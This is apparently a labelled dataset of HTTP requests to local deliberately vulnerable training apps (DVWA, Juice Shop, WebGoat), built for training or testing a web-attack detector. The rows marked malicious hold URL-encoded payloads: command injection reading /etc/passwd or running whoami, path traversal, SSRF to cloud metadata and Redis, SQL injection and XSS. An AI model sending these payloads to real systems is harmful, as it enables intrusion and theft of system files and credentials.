timestamp,app,method,url,path,query,post_data,label
2026-04-20T15:00:03.406860+00:00,dvwa,GET,http://localhost:8081/download?page=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,/download,page=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,,malicious
2026-03-10T05:09:13.010877,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-03-10T04:51:38.047321,juiceshop,GET,http://localhost:3000/font-mfizz.woff,/font-mfizz.woff,,,benign
2026-04-20T15:00:00.216860+00:00,dvwa,GET,http://localhost:8081/dvwa/css/main.css?cmd=8.8.8.8+%7C+id,/dvwa/css/main.css,cmd=8.8.8.8+%7C+id,,malicious
2026-04-20T15:00:03.638860+00:00,juiceshop,GET,http://localhost:3000/rest/products/42/reviews?endpoint=http%3A%2F%2Flocalhost%2Fadmin,/rest/products/42/reviews,endpoint=http%3A%2F%2Flocalhost%2Fadmin,,malicious
2026-03-10T04:52:09.620933,webgoat,GET,https://www.youtube.com/s/embeds/f41f64c3/www-embed-player-es6.vflset/www-embed-player-es6.js,https://www.youtube.com/s/embeds/f41f64c3/www-embed-player-es6.vflset/www-embed-player-es6.js,,,benign
2026-04-20T15:00:03.462860+00:00,webgoat,GET,http://localhost:8082/proxy?url=file%3A%2F%2F%2Fetc%2Fpasswd,/proxy,url=file%3A%2F%2F%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:04.089860+00:00,webgoat,GET,http://localhost:8082/js/search.js?ip=127.0.0.1%3B+sleep+5,/js/search.js,ip=127.0.0.1%3B+sleep+5,,malicious
2026-04-20T15:00:01.121860+00:00,webgoat,GET,http://localhost:8082/service/hint.mvc?id=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,/service/hint.mvc,id=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,malicious
2026-04-20T15:00:00.712860+00:00,juiceshop,GET,http://localhost:3000/export?path=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,/export,path=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,,malicious
2026-03-10T05:01:22.378135,juiceshop,GET,http://localhost:3000/rest/admin/application-configuration,/rest/admin/application-configuration,,,benign
2026-03-10T05:01:09.932913,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-04-20T15:00:03.682860+00:00,juiceshop,GET,http://localhost:3000/webhook/test?dest=gopher%3A%2F%2F127.0.0.1%3A6379%2F_PING,/webhook/test,dest=gopher%3A%2F%2F127.0.0.1%3A6379%2F_PING,,malicious
2026-04-20T15:00:01.052860+00:00,webgoat,GET,http://localhost:8082/css/img/logoBG.jpg?host=%27+OR+%271%27%3D%271%27+--+,/css/img/logoBG.jpg,host=%27+OR+%271%27%3D%271%27+--+,,malicious
2026-04-20T15:00:03.016860+00:00,webgoat,GET,http://localhost:8082/js/main.js?dest=http%3A%2F%2F127.0.0.1%3A22,/js/main.js,dest=http%3A%2F%2F127.0.0.1%3A22,,malicious
2026-03-10T05:02:24.256657,juiceshop,GET,http://localhost:3000/assets/public/favicon_js.ico,/assets/public/favicon_js.ico,,,benign
2026-03-10T04:51:37.582439,juiceshop,GET,http://localhost:3000/rest/admin/application-configuration,/rest/admin/application-configuration,,,benign
2026-03-10T05:12:19.188369,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc,/service/hint.mvc,,,benign
2026-04-20T15:00:01.315860+00:00,webgoat,POST,http://localhost:8082/feedback,/feedback,,token=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,malicious
2026-04-20T15:00:02.692860+00:00,juiceshop,GET,http://localhost:3000/rest/user/whoami?user=1%27+AND+%271%27%3D%271,/rest/user/whoami,user=1%27+AND+%271%27%3D%271,,malicious
2026-03-10T04:24:36.959280,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-04-20T15:00:02.551860+00:00,juiceshop,GET,http://localhost:3000/assets/public/images/products/permafrost.jpg?host=admin%27+--,/assets/public/images/products/permafrost.jpg,host=admin%27+--,,malicious
2026-04-20T15:00:03.866860+00:00,dvwa,POST,http://localhost:8081/api/review,/api/review,,password=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,malicious
2026-03-10T04:51:34.713294,juiceshop,GET,http://localhost:3000/runtime.js,/runtime.js,,,benign
2026-03-10T04:19:45.602184,juiceshop,GET,http://localhost:3000/rest/admin/application-configuration,/rest/admin/application-configuration,,,benign
2026-04-20T15:00:02.964860+00:00,webgoat,GET,http://localhost:8082/webhook/test?target=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,/webhook/test,target=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,,malicious
2026-03-10T04:51:14.537855,juiceshop,GET,http://localhost:3000/rest/shop/products/search?q=turmeric,/rest/shop/products/search,q=turmeric,,benign
2026-03-10T04:21:45.386188,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-04-20T15:00:04.644860+00:00,juiceshop,GET,http://localhost:3000/download?path=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,/download,path=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,,malicious
2026-04-20T15:00:04.223860+00:00,dvwa,GET,http://localhost:8081/dvwa/css/main.css?host=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,/dvwa/css/main.css,host=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,malicious
2026-03-10T04:50:38.303254,juiceshop,GET,http://localhost:3000/rest/admin/application-configuration,/rest/admin/application-configuration,,,benign
2026-03-10T05:10:40.319439,juiceshop,GET,http://localhost:3000/assets/public/images/products/melon_bike.jpeg,/assets/public/images/products/melon_bike.jpeg,,,benign
2026-03-10T04:21:56.999352,juiceshop,GET,http://localhost:3000/rest/admin/application-configuration,/rest/admin/application-configuration,,,benign
2026-03-10T04:58:19.863718,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc?lessonName=XXE&index=5,/service/hint.mvc,lessonName=XXE&index=5,,benign
2026-04-20T15:00:03.747860+00:00,webgoat,POST,http://localhost:8082/login,/login,,url=1%27+AND+%271%27%3D%271,malicious
2026-03-10T04:19:28.793207,juiceshop,GET,http://localhost:3000/assets/public/images/products/card_alpha.jpg,/assets/public/images/products/card_alpha.jpg,,,benign
2026-03-10T04:57:25.006771,webgoat,GET,https://googleads.g.doubleclick.net/pagead/id,https://googleads.g.doubleclick.net/pagead/id,,,benign
2026-03-10T05:00:48.812034,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-03-10T04:49:06.689391,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-04-20T15:00:00.777860+00:00,juiceshop,GET,http://localhost:3000/rest/shop/products/search?name=1+OR+1%3D1--,/rest/shop/products/search,name=1+OR+1%3D1--,,malicious
2026-03-10T05:02:33.129487,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/view/MenuButtonView.js,/js/goatApp/view/MenuButtonView.js,,,benign
2026-03-10T04:22:58.063551,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/view/HelpControlsView.js,/js/goatApp/view/HelpControlsView.js,,,benign
2026-03-10T05:07:22.500131,webgoat,GET,http://localhost:8082/WebGoat/service/lessonoverview.mvc/IDOR,/service/lessonoverview.mvc/IDOR,,,benign
2026-03-10T04:49:23.332977,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-03-10T04:51:46.386593,webgoat,GET,http://localhost:8082/WebGoat/js/libs/bootstrap.min.js,/js/libs/bootstrap.min.js,,,benign
2026-03-10T05:07:13.807586,webgoat,GET,http://localhost:8082/WebGoat/GeneralHeader.lesson,/GeneralHeader.lesson,,,benign
2026-04-20T15:00:03.199860+00:00,webgoat,GET,http://localhost:8082/css/main.css?ip=127.0.0.1+%26%26+whoami,/css/main.css,ip=127.0.0.1+%26%26+whoami,,malicious
2026-03-10T05:09:08.483496,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-04-20T15:00:02.570860+00:00,juiceshop,GET,http://localhost:3000/styles.css?ip=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,/styles.css,ip=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,,malicious
2026-03-10T04:24:10.600286,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-04-20T15:00:00.714860+00:00,juiceshop,POST,http://localhost:3000/assets/public/images/products/fan_facemask.jpg,/assets/public/images/products/fan_facemask.jpg,,token=admin%27+--,malicious
2026-03-10T04:52:13.860207,webgoat,GET,http://localhost:8082/WebGoat/xxe/comments,/xxe/comments,,,benign
2026-03-10T04:57:25.340490,webgoat,GET,https://i.ytimg.com/vi_webp/RijGNytjbOI/default.webp,https://i.ytimg.com/vi_webp/RijGNytjbOI/default.webp,,,benign
2026-04-20T15:00:01.445860+00:00,webgoat,GET,http://localhost:8082/js/libs/polyglot.min.js?cmd=127.0.0.1+%26%26+whoami,/js/libs/polyglot.min.js,cmd=127.0.0.1+%26%26+whoami,,malicious
2026-04-20T15:00:01.122860+00:00,webgoat,GET,http://localhost:8082/service/hint.mvc?path=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,/service/hint.mvc,path=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,,malicious
2026-04-20T15:00:01.727860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js?target=8.8.8.8+%7C+id,/dvwa/js/add_event_listeners.js,target=8.8.8.8+%7C+id,,malicious
2026-03-10T04:58:35.162701,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/view/PaginationControlView.js,/js/goatApp/view/PaginationControlView.js,,,benign
2026-03-10T05:04:25.755824,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-03-10T04:43:40.439183,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-04-20T15:00:00.408860+00:00,webgoat,GET,http://localhost:8082/plugins/bootstrap/fonts/glyphicons-halflings-regular.woff?cmd=127.0.0.1%3B+sleep+5,/plugins/bootstrap/fonts/glyphicons-halflings-regular.woff,cmd=127.0.0.1%3B+sleep+5,,malicious
2026-03-10T04:52:51.318891,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc?lessonName=CSRF&index=5,/service/hint.mvc,lessonName=CSRF&index=5,,benign
2026-03-10T05:03:00.946214,webgoat,GET,http://localhost:8082/WebGoat/xxe/comments,/xxe/comments,,,benign
2026-03-10T05:02:23.525275,juiceshop,GET,http://localhost:3000/api/Challenges/?sort=name,/api/Challenges/,sort=name,,benign
2026-03-10T04:53:19.247545,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/model/MenuCollection.js,/js/goatApp/model/MenuCollection.js,,,benign
2026-03-10T04:25:59.249415,webgoat,GET,http://localhost:8082/WebGoat/service/labels.mvc,/service/labels.mvc,,,benign
2026-03-10T05:02:10.991720,juiceshop,GET,http://localhost:3000/api/Products/2,/api/Products/2,,,benign
2026-03-10T04:57:09.624820,webgoat,GET,http://localhost:8082/WebGoat/service/lessonoverview.mvc/HttpProxies,/service/lessonoverview.mvc/HttpProxies,,,benign
2026-04-20T15:00:04.633860+00:00,juiceshop,GET,http://localhost:3000/api/SecurityQuestions/?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd,/api/SecurityQuestions/,page=..%2F..%2F..%2F..%2Fetc%2Fpasswd,,malicious
2026-03-10T04:47:00.163330,juiceshop,GET,http://localhost:3000/rest/admin/application-configuration,/rest/admin/application-configuration,,,benign
2026-04-20T15:00:01.517860+00:00,webgoat,GET,http://localhost:8082/images/challenge3-small.png?search=admin%27+--,/images/challenge3-small.png,search=admin%27+--,,malicious
2026-03-10T04:51:33.820210,juiceshop,GET,http://localhost:3000/api/Challenges/?sort=updatedAt&order=DESC,/api/Challenges/,sort=updatedAt&order=DESC,,benign
2026-04-20T15:00:03.009860+00:00,webgoat,GET,http://localhost:8082/js/libs/jquery-2.1.4.min.js?url=http%3A%2F%2F127.0.0.1%3A22,/js/libs/jquery-2.1.4.min.js,url=http%3A%2F%2F127.0.0.1%3A22,,malicious
2026-03-10T04:53:52.057648,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-03-10T05:08:46.461966,dvwa,GET,http://localhost:8081/vulnerabilities/csrf/,/vulnerabilities/csrf/,,,benign
2026-03-10T05:13:03.516696,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc?lessonName=IDOR&index=1,/service/hint.mvc,lessonName=IDOR&index=1,,benign
2026-04-20T15:00:02.224860+00:00,juiceshop,POST,http://localhost:3000/api/SecurityQuestions/,/api/SecurityQuestions/,,message=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,malicious
2026-04-20T15:00:03.026860+00:00,juiceshop,GET,http://localhost:3000/polyfills.js?target=localhost%3B+uname+-a,/polyfills.js,target=localhost%3B+uname+-a,,malicious
2026-03-10T04:53:51.243892,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-04-20T15:00:01.505860+00:00,juiceshop,POST,http://localhost:3000/assets/public/images/products/lemon_juice.jpg,/assets/public/images/products/lemon_juice.jpg,,token=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,malicious
2026-03-10T05:01:23.245687,juiceshop,GET,http://localhost:3000/assets/public/images/products/lemon_juice.jpg,/assets/public/images/products/lemon_juice.jpg,,,benign
2026-03-10T05:07:42.449887,webgoat,GET,http://localhost:8082/WebGoat/CSRF.lesson,/CSRF.lesson,,,benign
2026-03-10T05:02:42.249537,webgoat,GET,http://localhost:8082/WebGoat/css/quiz.css,/css/quiz.css,,,benign
2026-03-10T05:00:39.030916,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-04-20T15:00:00.413860+00:00,webgoat,GET,http://localhost:8082/IDOR.lesson?target=127.0.0.1+%26%26+whoami,/IDOR.lesson,target=127.0.0.1+%26%26+whoami,,malicious
2026-04-20T15:00:00.831860+00:00,webgoat,GET,http://localhost:8082/proxy?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_PING,/proxy,url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_PING,,malicious
2026-04-20T15:00:02.654860+00:00,webgoat,POST,http://localhost:8082/feedback,/feedback,,message=%3Cbody+onload%3Dalert%28document.domain%29%3E,malicious
2026-04-20T15:00:04.002860+00:00,webgoat,POST,http://localhost:8082/comment,/comment,,email=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,malicious
2026-03-10T05:03:53.004817,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc?lessonName=SSRF&index=2,/service/hint.mvc,lessonName=SSRF&index=2,,benign
2026-04-20T15:00:02.757860+00:00,dvwa,GET,http://localhost:8081/export?page=..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,/export,page=..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,,malicious
2026-03-10T04:53:23.386066,dvwa,GET,http://localhost:8081/security.php,/security.php,,,benign
2026-03-10T05:01:11.334554,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-03-10T04:57:03.827490,webgoat,GET,http://localhost:8082/WebGoat/service/lessoninfo.mvc/WebGoatIntroduction.lesson.lesson,/service/lessoninfo.mvc/WebGoatIntroduction.lesson.lesson,,,benign
2026-03-10T05:10:48.952611,juiceshop,GET,http://localhost:3000/assets/public/favicon_js.ico,/assets/public/favicon_js.ico,,,benign
2026-03-10T04:44:08.100058,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-04-20T15:00:00.730860+00:00,juiceshop,GET,http://localhost:3000/assets/public/favicon_js.ico?cmd=127.0.0.1%3B+sleep+5,/assets/public/favicon_js.ico,cmd=127.0.0.1%3B+sleep+5,,malicious
2026-03-10T05:11:41.265365,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/view/PaginationControlView.js,/js/goatApp/view/PaginationControlView.js,,,benign
2026-04-20T15:00:04.796860+00:00,juiceshop,POST,http://localhost:3000/rest/user/whoami,/rest/user/whoami,,url=1+OR+1%3D1--,malicious
2026-03-10T04:20:44.687811,webgoat,GET,http://localhost:8082/WebGoat/css/img/logoBG.jpg,/css/img/logoBG.jpg,,,benign
2026-03-10T05:04:51.558247,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-03-10T04:47:00.156208,juiceshop,GET,http://localhost:3000/rest/admin/application-version,/rest/admin/application-version,,,benign
2026-03-10T05:08:57.639976,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-04-20T15:00:03.415860+00:00,juiceshop,GET,http://localhost:3000/proxy?url=http%3A%2F%2Flocalhost%2Fadmin,/proxy,url=http%3A%2F%2Flocalhost%2Fadmin,,malicious
2026-03-10T04:18:23.059722,dvwa,GET,http://localhost:8081/vulnerabilities/sqli_blind/?id=1&Submit=Submit,/vulnerabilities/sqli_blind/,id=1&Submit=Submit,,benign
2026-03-10T05:07:28.100210,webgoat,GET,http://localhost:8082/WebGoat/xxe/comments,/xxe/comments,,,benign
2026-03-10T04:54:03.231534,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-04-20T15:00:00.890860+00:00,juiceshop,GET,http://localhost:3000/rest/basket/14?ip=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,/rest/basket/14,ip=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,,malicious
2026-03-10T05:04:09.041920,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-04-20T15:00:02.623860+00:00,dvwa,GET,http://localhost:8081/security.php?user=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,/security.php,user=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,,malicious
2026-04-20T15:00:04.228860+00:00,webgoat,GET,http://localhost:8082/js/goatApp/model/HTMLContentModel.js?target=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,/js/goatApp/model/HTMLContentModel.js,target=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,,malicious
2026-03-10T04:50:39.957363,juiceshop,GET,http://localhost:3000/api/Quantitys/,/api/Quantitys/,,,benign
2026-04-20T15:00:04.928860+00:00,webgoat,GET,http://localhost:8082/css/img/delang.svg?file=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,/css/img/delang.svg,file=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:00.796860+00:00,juiceshop,GET,http://localhost:3000/assets/public/favicon_js.ico?file=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,/assets/public/favicon_js.ico,file=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,,malicious
2026-03-10T05:04:43.965755,dvwa,GET,http://localhost:8081/vulnerabilities/xss_r/,/vulnerabilities/xss_r/,,,benign
2026-03-10T05:11:18.911979,juiceshop,GET,http://localhost:3000/api/Products/6,/api/Products/6,,,benign
2026-03-10T04:48:45.872204,webgoat,GET,http://localhost:8082/WebGoat/service/lessonmenu.mvc,/service/lessonmenu.mvc,,,benign
2026-04-20T15:00:04.601860+00:00,webgoat,POST,http://localhost:8082/feedback,/feedback,,password=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,malicious
2026-03-10T05:02:33.132486,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/model/HintCollection.js,/js/goatApp/model/HintCollection.js,,,benign
2026-03-10T04:25:59.229606,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/model/MenuModel.js,/js/goatApp/model/MenuModel.js,,,benign
2026-04-20T15:00:01.597860+00:00,dvwa,POST,http://localhost:8081/login,/login,,comment=1%27+AND+%271%27%3D%271,malicious
2026-04-20T15:00:03.574860+00:00,dvwa,POST,http://localhost:8081/comment,/comment,,username=%3Csvg%2Fonload%3Dalert%281%29%3E,malicious
2026-04-20T15:00:01.206860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js?host=%3Csvg%2Fonload%3Dalert%281%29%3E,/dvwa/js/add_event_listeners.js,host=%3Csvg%2Fonload%3Dalert%281%29%3E,,malicious
2026-04-20T15:00:00.609860+00:00,webgoat,GET,http://localhost:8082/view?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd,/view,page=..%2F..%2F..%2F..%2Fetc%2Fpasswd,,malicious
2026-03-10T04:49:10.511822,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-04-20T15:00:03.093860+00:00,webgoat,POST,http://localhost:8082/submit,/submit,,token=%27+OR+%271%27%3D%271%27+--+,malicious
2026-03-10T05:11:41.128323,webgoat,GET,http://localhost:8082/WebGoat/plugins/bootstrap/css/bootstrap.min.css,/plugins/bootstrap/css/bootstrap.min.css,,,benign
2026-04-20T15:00:02.488860+00:00,juiceshop,POST,http://localhost:3000/api/review,/api/review,,token=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,malicious
2026-03-10T05:01:01.065001,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-04-20T15:00:03.418860+00:00,webgoat,GET,http://localhost:8082/download?page=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,/download,page=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,,malicious
2026-04-20T15:00:03.664860+00:00,juiceshop,GET,http://localhost:3000/export?template=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,/export,template=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,,malicious
2026-03-10T04:55:25.681169,juiceshop,GET,http://localhost:3000/assets/public/images/products/eggfruit_juice.jpg,/assets/public/images/products/eggfruit_juice.jpg,,,benign
2026-04-20T15:00:04.465860+00:00,webgoat,GET,http://localhost:8082/service/hint.mvc?host=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,/service/hint.mvc,host=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:00.215860+00:00,juiceshop,POST,http://localhost:3000/rest/products/33/reviews,/rest/products/33/reviews,,password=%3Cbody+onload%3Dalert%28document.domain%29%3E,malicious
2026-03-10T04:21:20.610754,dvwa,GET,http://localhost:8081/about.php,/about.php,,,benign
2026-03-10T04:18:35.122693,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-04-20T15:00:02.029860+00:00,webgoat,GET,http://localhost:8082/https://jnn-pa.googleapis.com/$rpc/google.internal.waa.v1.Waa/GenerateIT?host=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,/https://jnn-pa.googleapis.com/$rpc/google.internal.waa.v1.Waa/GenerateIT,host=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,,malicious
2026-03-10T05:07:05.921984,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/model/LessonInfoModel.js,/js/goatApp/model/LessonInfoModel.js,,,benign
2026-03-10T05:00:49.718855,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
